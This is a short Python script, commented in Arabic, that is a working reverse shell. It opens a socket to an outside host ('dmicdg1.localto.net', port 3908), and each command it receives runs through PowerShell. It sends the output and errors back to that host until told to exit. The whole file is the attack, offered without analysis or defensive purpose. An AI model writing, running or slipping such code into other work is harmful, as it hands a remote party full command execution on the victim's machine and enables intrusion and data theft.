import socket
import subprocess

# إعداد عنوان IP والمنفذ
HOST = 'dmicdg1.localto.net'
PORT = 3908
# إنشاء socket
s = socket.socket()
s.connect((HOST, PORT))

# بدء PowerShell مباشرة
while True:
    # الانتظار لاستقبال الأوامر
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break

    # تشغيل الأمر باستخدام PowerShell
    process = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output, error = process.communicate()

    # إرسال النتيجة مرة أخرى إلى الخادم
    s.send(output + error)

# إغلاق الاتصال
s.close()
